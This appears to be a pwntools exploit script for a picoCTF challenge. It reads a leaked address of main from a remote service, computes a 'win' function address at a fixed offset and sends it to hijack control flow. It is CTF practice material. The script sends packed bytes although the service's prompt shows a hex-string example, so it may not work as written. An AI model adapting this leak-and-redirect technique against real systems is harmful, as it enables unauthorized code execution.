#!/usr/bin/env python3
from pwn import *

io = remote("rescued-float.picoctf.net", 53901)
#getting the main adrress from the stdrout
main_address_int = int(io.recvline()[17:].decode().strip(), 16)
# calculation of main_adrress - win adrress
target_addr_int = main_address_int - 0x96
target_addr = p64(target_addr_int)

io.recvuntil(b'Enter the address to jump to, ex => 0x12345: ')
io.sendline(target_addr)
print(io.recvline().decode())
print(io.recvline().decode())
io.interactive()